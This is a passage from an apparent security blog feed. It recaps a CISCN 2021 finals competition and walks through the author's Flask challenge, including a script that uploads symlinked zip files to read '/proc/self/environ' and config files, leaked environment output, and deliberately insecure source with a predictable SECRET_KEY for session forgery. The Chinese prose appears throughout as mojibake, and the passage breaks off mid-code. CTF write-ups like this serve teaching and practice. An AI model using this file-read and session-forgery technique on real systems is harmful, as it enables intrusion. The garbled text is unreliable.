    <summary type="html">&lt;h1 id=&quot;çŸ©é˜µæ±‚é€†çš„å‡ ç§æ–¹æ³•&quot;&gt;&lt;a href=&quot;#çŸ©é˜µæ±‚é€†çš„å‡ ç§æ–¹æ³•&quot; class=&quot;headerlink&quot; title=&quot;çŸ©é˜µæ±‚é€†çš„å‡ ç§æ–¹æ³•&quot;&gt;&lt;/a&gt;çŸ©é˜µæ±‚é€†çš„å‡ ç§æ–¹æ³•&lt;/h1&gt;&lt;p&gt;åœ¨å­¦ä¹ Hillç®—æ³•çš„è¿‡ç¨‹ä¸­ï¼Œçªç„¶æ„è¯†åˆ°è‡ªå·±å¯¹çŸ©é˜µçš„å¾ˆå¤šä¸œè¥¿éƒ½å·²ç»è¿˜ç»™è€å¸ˆï¼Œäºæ˜¯æ‰“ç®—æŠŠ</summary>
      
    
    
    
    <category term="åŸºç¡€å­¦ä¹ " scheme="http://www.fxizenta.design/categories/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="çº¿æ€§ä»£æ•°" scheme="http://www.fxizenta.design/categories/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0/"/>
    
    
    <category term="çŸ©é˜µ" scheme="http://www.fxizenta.design/tags/%E7%9F%A9%E9%98%B5/"/>
    
  </entry>
  
  <entry>
    <title>2021ciscnå†³èµ›æ€»ç»“</title>
    <link href="http://www.fxizenta.design/2021/07/19/ciscn2021final/"/>
    <id>http://www.fxizenta.design/2021/07/19/ciscn2021final/</id>
    <published>2021-07-18T23:14:21.000Z</published>
    <updated>2021-07-23T09:06:06.369Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CISCN2021å†³èµ›æ€»ç»“"><a href="#CISCN2021å†³èµ›æ€»ç»“" class="headerlink" title="CISCN2021å†³èµ›æ€»ç»“"></a>CISCN2021å†³èµ›æ€»ç»“</h1><p>ç®—æ˜¯é˜Ÿä¼ä¸»åŠ›å¸ˆå…„å…¨éƒ¨æ¯•ä¸šï¼ŒåŠ ä¸Š18çº§é˜Ÿå‘˜ç›¸å¯¹æ–­å±‚æƒ…å†µä¹‹åçš„ç¬¬ä¸€åœºçº¿ä¸‹èµ›ï¼ŒåŒæ—¶ä¹Ÿæ˜¯æˆ‘å‚åŠ çš„ç¬¬ä¸€åœºawdèµ›åˆ¶çš„æ¯”èµ›ï¼Œåœ¨ç»éªŒè¿˜æ˜¯è¿œè¿œä¸è¶³çš„ï¼Œä¹Ÿå¯¼è‡´è¿™æ¬¡awdé˜¶æ®µå¤±åˆ†ä¸¥é‡ï¼Œå°¤å…¶æ˜¯web2çš„é¢˜ç›®å®Œå…¨æ˜¯ä¸€ä¸ªå¤±å®ˆçš„é˜¶æ®µï¼Œè¢«å„ä½å¸ˆå‚…ä»¬ç•™ä¸‹äº†ä¸€å †åé¢ï¼ŒåŒæ—¶è¿˜ä¸çŸ¥é“æ€ä¹ˆå½»åº•åˆ é™¤ï¼Œç»éªŒè¿˜æ˜¯è¿œè¿œä¸è¶³ï¼Œæ‰€ä»¥å†™ä¸‹æœ¬æ–‡æ¥æ€»ç»“åœ¨è¿™æ¬¡çº¿ä¸‹èµ›ä¸­é˜Ÿä¼æ‰€æš´éœ²çš„é—®é¢˜ï¼Œä»¥åŠåœ¨æœªæ¥çš„æ¯”èµ›ä¸­å¯ä»¥åšçš„æ›´å¥½çš„åœ°æ–¹ã€‚</p><h2 id="awdé˜¶æ®µ"><a href="#awdé˜¶æ®µ" class="headerlink" title="awdé˜¶æ®µ"></a>awdé˜¶æ®µ</h2><h3 id="å¼€å±€é˜¶æ®µ"><a href="#å¼€å±€é˜¶æ®µ" class="headerlink" title="å¼€å±€é˜¶æ®µ"></a>å¼€å±€é˜¶æ®µ</h3><p>å¼€å±€çš„æœ€åŸºæœ¬çš„æ“ä½œï¼Œä¸‹é¢æ˜¯æˆ‘ä»¬é˜Ÿä¼åšå‡ºçš„æ“ä½œ</p><ul><li>dumpä¸‹æºç </li><li>æ”¹æ•°æ®åº“å¯†ç </li><li>dumpæ•°æ®åº“</li><li>å°è¯•ä¸Šweblogger</li><li>å°†æºç ç”¨Dç›¾æ‰«ä¸€éå…ˆ</li></ul><h3 id="æ”»å‡»é˜¶æ®µ"><a href="#æ”»å‡»é˜¶æ®µ" class="headerlink" title="æ”»å‡»é˜¶æ®µ"></a>æ”»å‡»é˜¶æ®µ</h3><p>è¿™æ¬¡æ¯”èµ›ç”±äºæ²¡æœ‰ç»éªŒï¼Œè®¸å¤šæ“ä½œå®åœ¨å¤ªè¿‡ä¸ç†Ÿç»ƒï¼Œå‡ ä¹æ²¡æœ‰å¤šå°‘æ—¶é—´å“ªæ¥é˜…è¯»æºç ï¼Œå°¤å…¶å› ä¸ºweb1å’Œweb2é¢˜å®Œå…¨å¤±å®ˆçš„æƒ…å†µï¼Œå¤§å¤šæ—¶å€™éƒ½åœ¨ç„¦å¤´çƒ‚é¢çš„æƒ³åŠæ³•åœ¨è¿‡checkçš„å‰æä¸‹è¿›è¡Œé˜²å®ˆï¼Œå¥½å‡ æ¬¡å› ä¸ºé˜²å®ˆå§¿åŠ¿ä¸æ°å½“è€Œæ²¡é€šè¿‡checkå¯¼è‡´æ‰£åˆ†ï¼ŒåºŸäº†ï¼Œäºæ˜¯ï¼Œåœ¨è¿›æ”»æ–¹é¢æ¯”èµ›å°±å˜æˆäº†æ ¹æ®æµé‡æŠ„ç­”æ¡ˆï¼Œç„¶åå†™è„šæœ¬è¿›è¡Œè‡ªåŠ¨åŒ–ã€‚</p><p>ä¸è¿‡è¿™æ¬¡æ¯”èµ›çŠ¯äº†ä¸€ä¸ªå¾ˆå¤§çš„é”™è¯¯ï¼Œä¸€å¼€å§‹å› ä¸ºæŠ„ä½œä¸šæŠ„çš„æ¯”è¾ƒå¿«çš„æ„¿æ„ï¼ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆç¡¬æ˜¯æ‰“æˆäº†é“ä¸‰ï¼Œè¿›æ”»å…¨ç¨‹çœ‹æµé‡ï¼‰ï¼Œæ’åè¿˜æ˜¯æ¯”è¾ƒé å‰çš„ï¼Œä½†æ˜¯ç”±äºæ²¡æœ‰ç¬¬ä¸€æ—¶é—´é€‰æ‹©è‡ªåŠ¨åŒ–è„šæœ¬è€Œå¯¼è‡´å‰é¢å®è´µçš„å‡ è½®æ²¡èƒ½å¤Ÿæ‰“å®Œå…¨éƒ¨æ²¡æœ‰è¿›è¡Œä¿®å¤çš„é¶æœºï¼ŒåŒæ—¶è¿˜æœ‰å°±æ˜¯å¤ªè¿‡æ‰§ç€äºweb1ï¼Œå¯¼è‡´web2æµé‡å‡ºæ¥å¥½å‡ è½®ä¹‹åæ‰å»çœ‹ï¼Œå¯¼è‡´äº†é˜Ÿä¼å°‘äº†ä¸€ä¸ªé¢˜çš„æ”»å‡»å¾—åˆ†ï¼Œè¿™äº›éƒ½æ˜¯éå¸¸è‡´å‘½çš„é”™è¯¯ï¼Œå½’æ ¹åˆ°åº•æ„Ÿè§‰è¿˜æ˜¯åœ¨æ¯”èµ›çš„æ—¶å€™æ€è·¯ä¸å¤Ÿæ¸…æ™°ï¼ŒåŠ¨ä½œå¤ªæ…¢äº†ã€‚</p><h3 id="é˜²å®ˆé˜¶æ®µ"><a href="#é˜²å®ˆé˜¶æ®µ" class="headerlink" title="é˜²å®ˆé˜¶æ®µ"></a>é˜²å®ˆé˜¶æ®µ</h3><p>é˜²å®ˆé˜¶æ®µå¯¹äºä¸æ­»é©¬åˆ™æ˜¯é€‰æ‹©killè¿›ç¨‹ï¼Œå’Œæƒ³åŠæ³•å†™ä¸ªä¸æ–­åˆ åé—¨çš„è„šæœ¬è¿›è¡Œæ¡ä»¶ç«äº‰ï¼Œä½†æ˜¯ç”±äºè‡ªèº«å¤ªèœä»£ç èƒ½åŠ›ä½ä¸‹ï¼Œæ¡ä»¶ç«äº‰çš„è„šæœ¬åˆ°web1ä¸‹äº†éƒ½è¿˜æ²¡å†™å‡ºæ¥ï¼Œå¤ªèœäº†ï¼ŒåºŸäº†ï¼Œè¿˜å¾—åŠ å¼ºä¸€ä¸‹å¾ˆä¹…æ²¡æœ‰æå‡çš„ä»£ç èƒ½åŠ›äº†ã€‚web3åˆ™ä¸»è¦çš„åº”å¯¹æ‰‹æ®µæ˜¯æŠŠç”¨äºè¯»flagçš„å›¾ç‰‡ç›´æ¥åˆ äº†ï¼Œä½†æ˜¯è¿™é‡Œæˆ‘çŠ¯äº†ä¸€ä¸ªè‡´å‘½çš„é”™è¯¯ï¼Œæˆ‘åªæ˜¯æŠŠæˆ‘æœ€å…ˆçœ‹åˆ°æ‰“æˆ‘ä»¬å®¹å™¨çš„å¤§ä½¬é‚£ä¸ªè·¯å¾„ä¸‹é¢çš„å››ä¸ªå›¾ç‰‡åˆ äº†ï¼Œå®Œå…¨æ²¡æœ‰å¯¹æ‰€æœ‰å¯ä»¥åˆ©ç”¨çš„å…¶ä»–è·¯å¾„ä¸‹çš„å›¾ç‰‡è¿›è¡Œæ£€æŸ¥ï¼Œå¯¼è‡´å¯èƒ½æœ‰è¶…è¿‡åè½®ä»¥ä¸Šçš„æ—¶å€™ï¼Œæˆ‘ä»¬é‚£é¢˜éƒ½æ˜¯å¤±å®ˆçŠ¶å†µï¼Œåœ¨æ¯”èµ›ç¦»ç»“æŸè¿˜2å°æ—¶çš„æ—¶å€™æ‰å‘ç°è‡ªå·±è¿™ä¸ªè‡´å‘½çš„é”™è¯¯ï¼Œå¯¼è‡´å¤šäº†å¾ˆå¤šä¸è¯¥çš„å¤±åˆ†ï¼ŒåŒæ—¶ä¹Ÿæ²¡èƒ½åŠæ—¶é€šè¿‡è¿™ä¸ªå®¹æ˜“é—æ¼çš„ç‚¹å¤šæ‰“å‡ ä¸ªä¹Ÿæ²¡æ³¨æ„çš„è¿™ä¸ªé—®é¢˜çš„å¸ˆå‚…çš„é¶æœºå‡ è½®ï¼Œäºæ­»äº†ï¼Œå“­äº†ã€‚</p><h2 id="buildé˜¶æ®µ"><a href="#buildé˜¶æ®µ" class="headerlink" title="buildé˜¶æ®µ"></a>buildé˜¶æ®µ</h2><h3 id="é¢˜ç›®çš„é€‰å–"><a href="#é¢˜ç›®çš„é€‰å–" class="headerlink" title="é¢˜ç›®çš„é€‰å–"></a>é¢˜ç›®çš„é€‰å–</h3><p>é€‰å–äº†flaskæ¡†æ¶ä¸‹çš„sessionä¼ªé€ ï¼Œä¹Ÿç®—æ˜¯å¸¸è§è€ƒç‚¹äº†ï¼Œæ¯”è¾ƒ</p><h3 id="è€ƒç‚¹çš„è®¾è®¡"><a href="#è€ƒç‚¹çš„è®¾è®¡" class="headerlink" title="è€ƒç‚¹çš„è®¾è®¡"></a>è€ƒç‚¹çš„è®¾è®¡</h3><p>1ã€æ•æ„Ÿä¿¡æ¯æ³„éœ²<br>2ã€Flask Sessionæœºåˆ¶<br>3ã€ä¼ªéšæœºæ•°</p><p>å“ˆå“ˆå“ˆå“ˆå“ˆæ²¡æƒ³åˆ°æœ€åé¢˜ç›®å±…ç„¶è¢«é€‰ä¸Šäº†ï¼Œç„¶åè¢«20å¤šä¸ªå¸ˆå‚…æ‰“ç©¿äº†ï¼Œä¹Ÿçœ‹åˆ°æœ‰å¸ˆå‚…åœ¨é‚£åæ§½pythonç‰ˆæœ¬çš„é—®é¢˜äº†ï¼Œå“ˆå“ˆå“ˆå“ˆå“ˆç¡®å®æ˜¯å› ä¸ºéšæœºæ•°çš„æ„¿æ„æ‰€ä»¥å¿…é¡»å¾—ç”¨python3ï¼Œè¿™é‡Œç¡®å®æœ‰ç‚¹å°å‘ã€‚</p><h3 id="checkè„šæœ¬"><a href="#checkè„šæœ¬" class="headerlink" title="checkè„šæœ¬"></a>checkè„šæœ¬</h3><p>check</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">ip=sys.argv[<span class="number">1</span>]</span><br><span class="line">port=sys.argv[<span class="number">2</span>]</span><br><span class="line">url = <span class="string">&quot;http://&quot;</span>+ip+<span class="string">&quot;:&quot;</span>+<span class="built_in">str</span>(port)+<span class="string">&quot;/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_file</span>(<span class="params">file_name</span>):</span></span><br><span class="line">    link(file_name)</span><br><span class="line">    files = &#123;<span class="string">&#x27;the_file&#x27;</span>: <span class="built_in">open</span>(file_name[-<span class="number">5</span>:] + <span class="string">&#x27;.zip&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)&#125;</span><br><span class="line">    r2 = s.post(url+<span class="string">&#x27;upload&#x27;</span>, files=files)</span><br><span class="line">    <span class="keyword">return</span> r2.text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">link</span>(<span class="params">file_name</span>):</span></span><br><span class="line">    os.system(<span class="string">&#x27;ln -s &#123;file_name&#125; &#123;output&#125;&#x27;</span>.<span class="built_in">format</span>(file_name = file_name, output = file_name[-<span class="number">5</span>:]))</span><br><span class="line">    os.system(<span class="string">&#x27;zip -y -m &#123;output&#125;.zip &#123;output&#125;&#x27;</span>.<span class="built_in">format</span>(file_name = file_name, output = file_name[-<span class="number">5</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> requests.Session() <span class="keyword">as</span> s:</span><br><span class="line">    content=s.get(url).text</span><br><span class="line">    <span class="keyword">if</span> content.find(<span class="string">&quot;I will tell you a secret, but you should become admin first.&quot;</span>)==-<span class="number">1</span>:</span><br><span class="line">        print(<span class="string">&#x27;(0, error1)&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;tmp&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">&quot;gjklawegklwjgklajgwl&quot;</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;zip -y -m &#123;output&#125;.zip &#123;output&#125;&#x27;</span>.<span class="built_in">format</span>(file_name = <span class="string">&quot;tmp&quot;</span>, output = <span class="string">&quot;tmp&quot;</span>))</span><br><span class="line">    tmp=s.post(url+<span class="string">&#x27;upload&#x27;</span>, files = &#123;<span class="string">&#x27;the_file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&quot;tmp.zip&quot;</span>, <span class="string">&#x27;rb&#x27;</span>)&#125;).text</span><br><span class="line">    print(tmp)</span><br><span class="line">    <span class="keyword">if</span> tmp!= <span class="string">&quot;gjklawegklwjgklajgwl&quot;</span>:</span><br><span class="line">        print(<span class="string">&#x27;(0, error2)&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        en = read_file(<span class="string">&#x27;/proc/self/environ&#x27;</span>)</span><br><span class="line">        <span class="comment">#t=re.search(&#x27;gwekgwegwg=(.*?)\x00&#x27;, en).group(1)</span></span><br><span class="line">        <span class="comment">#print(t)</span></span><br><span class="line">        ini = re.search(<span class="string">&#x27;UWSGI_INI=(.*?)\x00&#x27;</span>, en).group(<span class="number">1</span>)</span><br><span class="line">        pwd = re.search(<span class="string">&#x27;PWD=(.*?)\x00&#x27;</span>, en).group(<span class="number">1</span>)</span><br><span class="line">        ini = read_file(ini)</span><br><span class="line">        source = re.search(<span class="string">&#x27;module = .*?\.(.*?)\n&#x27;</span>, ini).group(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&#x27;(1, Vulns)&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    print(<span class="string">&#x27;(0, error3)&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><h4 id="ç¬¬ä¸€æ­¥"><a href="#ç¬¬ä¸€æ­¥" class="headerlink" title="ç¬¬ä¸€æ­¥"></a>ç¬¬ä¸€æ­¥</h4><p>è¿›å…¥é¢˜ç›®å‘ç°ä¸€ä¸ªä¸Šä¼ ç‚¹å’Œæç¤ºâ€œI will tell you a secret, but you should become admin first.â€ï¼Œæ ¹æ®æç¤ºå¯ä»¥çŒœæƒ³åˆ°å¾—å…ˆæƒ³åŠæ³•ä»¥adminèº«ä»½ç™»å½•ï¼ŒæŸ¥çœ‹cookieå¯ä»¥çœ‹åˆ°sessionï¼Œå€¼ä¸ºç–‘ä¼¼base64çš„ä¸€ä¸²å­—ç¬¦ä¸²ï¼Œdecodeä¹‹åä¸ºç±»ä¼¼{â€œusernameâ€:â€2333â€}çš„ä¿¡æ¯ï¼Œå¯ä»¥çŒœåˆ°ä½¿ç”¨çš„æ˜¯securecookieæœºåˆ¶ï¼Œå¦‚æœèƒ½å¤Ÿå¾—åˆ°ç­¾åçš„keyå’Œç­¾åæ–¹æ³•ç­‰ç›¸å…³ä¿¡æ¯å°±èƒ½æƒ³åŠæ³•ä¼ªé€ sessionï¼Œæ²¡çŒœåˆ°ä¹Ÿæ²¡å…³ç³»ï¼Œæ¥ä¸‹æ¥çš„æ€è·¯æ˜¯ä¸€æ ·çš„ï¼Œå°±æ˜¯æƒ³åŠæ³•å…ˆæ‹¿åˆ°æºç ã€‚</p><h4 id="ç¬¬äºŒæ­¥"><a href="#ç¬¬äºŒæ­¥" class="headerlink" title="ç¬¬äºŒæ­¥"></a>ç¬¬äºŒæ­¥</h4><p>æµ‹è¯•ä¸Šä¼ ç‚¹ï¼Œå‘ç°åªèƒ½ä¸Šä¼ zipæ–‡ä»¶ï¼Œå¹¶è¿”å›zipè§£å‹åçš„æ–‡ä»¶å†…å®¹ã€‚å°è¯•å‹ç¼©è½¯é“¾æ¥ä¸Šä¼ ï¼Œå‘ç°ä¼šå›æ˜¾å¯¹åº”çš„æ–‡ä»¶å†…å®¹ï¼Œè¿™æ ·å°±å®ç°äº†ä¸€ä¸ªä»»æ„æ–‡ä»¶ä¸‹è½½ï¼Œé€šè¿‡è¿™ä¸ªå¯ä»¥å¼€å§‹æƒ³åŠæ³•æ‰¾åˆ°æºç çš„è·¯å¾„ï¼Œå¹¶ä¸”åº”è¯¥ä¹Ÿå·²ç»æ‰¾åˆ°äº†åšé¢˜æ€è·¯ï¼Œ æˆ‘ä»¬è¦ç”¨åˆ°ä¸Šä¼ zipfileè¯»å–åˆ°<code>SECRET_KEY</code>ï¼Œç„¶åä¼ªé€ adminçš„sessionè¿›è¡Œç™»å½•ã€‚ </p><h4 id="ç¬¬ä¸‰æ­¥"><a href="#ç¬¬ä¸‰æ­¥" class="headerlink" title="ç¬¬ä¸‰æ­¥"></a>ç¬¬ä¸‰æ­¥</h4><p>æ¥ä¸‹æ¥ä¸»è¦ç›®æ ‡æ˜¯è·å–æºç </p><p>å¦‚æœå¯¹linuxæ¯”è¾ƒäº†è§£åº”è¯¥ä¼šçŸ¥é“ <code>/proc</code>ç›®å½• ï¼Œç„¶åé€šè¿‡ <code>/proc/self/environ</code>çš„è½¯é“¾æ¥ æ¥è·å¾—flaskçš„ç¯å¢ƒå˜é‡ï¼Œç¯å¢ƒå˜é‡ä¸­å¯ä»¥æ‰¾åˆ°é…ç½®æ–‡ä»¶è·¯å¾„å’Œä¸€äº›ä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">UWSGI_ORIGINAL_PROC_NAME&#x3D;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;uwsgi</span><br><span class="line">SUPERVISOR_GROUP_NAME&#x3D;uwsgi</span><br><span class="line">HOSTNAME&#x3D;5a000ec609dc</span><br><span class="line">PYTHON_PIP_VERSION&#x3D;20.1</span><br><span class="line">HOME&#x3D;&#x2F;root</span><br><span class="line">GPG_KEY&#x3D;0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D</span><br><span class="line">UWSGI_INI&#x3D;&#x2F;app&#x2F;y0u_found_it.ini</span><br><span class="line">NGINX_MAX_UPLOAD&#x3D;0</span><br><span class="line">UWSGI_PROCESSES&#x3D;16</span><br><span class="line">STATIC_URL&#x3D;&#x2F;static</span><br><span class="line">PYTHON_GET_PIP_URL&#x3D;https:&#x2F;&#x2F;github.com&#x2F;pypa&#x2F;get-pip&#x2F;raw&#x2F;1fe530e9e3d800be94e04f6428460fc4fb94f5a9&#x2F;get-pip.pyUWSGI_CHEAPER&#x3D;2PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;binLANG&#x3D;C.UTF-8</span><br><span class="line">SUPERVISOR_ENABLED&#x3D;1</span><br><span class="line">PYTHON_VERSION&#x3D;3.6.10</span><br><span class="line">NGINX_WORKER_PROCESSES&#x3D;auto</span><br><span class="line">SUPERVISOR_SERVER_URL&#x3D;unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;supervisor.sock</span><br><span class="line">SUPERVISOR_PROCESS_NAME&#x3D;uwsgi</span><br><span class="line">LISTEN_PORT&#x3D;80</span><br><span class="line">STATIC_INDEX&#x3D;0</span><br><span class="line">PWD&#x3D;&#x2F;app&#x2F;y0u_found_it</span><br><span class="line">PYTHON_GET_PIP_SHA256&#x3D;ce486cddac44e99496a702aa5c06c5028414ef48fdfd5242cd2fe559b13d4348</span><br><span class="line">STATIC_PATH&#x3D;&#x2F;app&#x2F;static</span><br><span class="line">PYTHONPATH&#x3D;&#x2F;app</span><br><span class="line">UWSGI_RELOADS&#x3D;0</span><br></pre></td></tr></table></figure><p> æ‰«ä¸€çœ¼è¿‡å»ï¼Œèƒ½å¤Ÿå‘ç°ä¸€é¡¹<code>UWSGI_INI</code>ï¼Œä»¥INIç»“å°¾ï¼Œåº”è¯¥æ˜¯ä¸ªé…ç½®æ–‡ä»¶ ï¼Œè€Œä¸”ä»å‘½åæ¥çœ‹</p><p>â€y0u_found_it.iniâ€œå·²ç»åœ¨æç¤ºè¿™ä¸ªiniæ–‡ä»¶æœ‰é—®é¢˜ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥ æ„é€ è½¯é“¾æ¥ï¼Œç”Ÿæˆzipï¼Œä¸Šä¼ è¯»å–ã€‚<br>å¾—åˆ°<code>/app/ y0u_found_it.ini</code>å†…å®¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[uwsgi]</span><br><span class="line">module &#x3D; y0u_found_it.y0u_found_it_main</span><br><span class="line">callable&#x3D;app</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±æ‰¾åˆ°äº†æºä»£ç è·¯å¾„<code>/app/y0u_found_it/y0u_found_it_main.py</code></p><p>æ¥ä¸‹æ¥è·å–æºç å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,session,render_template,redirect, url_for, escape, request,Response</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">100</span>)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&#x27;./uploads&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = <span class="built_in">set</span>([<span class="string">&#x27;zip&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span>(<span class="params">filename</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    error = request.args.get(<span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(error == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">        session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, forbidden=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&quot;guest&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span 